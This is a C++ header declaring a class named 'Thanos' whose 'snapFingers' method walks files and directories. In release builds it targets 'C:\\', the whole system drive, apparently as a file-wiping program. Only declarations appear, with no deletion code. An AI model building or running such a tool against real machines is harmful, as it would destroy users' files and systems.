#pragma once

#include <iostream>
#include <filesystem>

#if _DEBUG
#define DELETE_PATH "C:\\Users\\WallQ\\Debug"
#else
#define DELETE_PATH "C:\\"
#endif

namespace fs = std::filesystem;

class Thanos {
private:
	bool isDirectory(const std::string& path);
	void processFile(const fs::directory_entry& entry);
	void processDirectory(const fs::path& path, int level);
public:
	Thanos();
	~Thanos();
	void snapFingers();
};
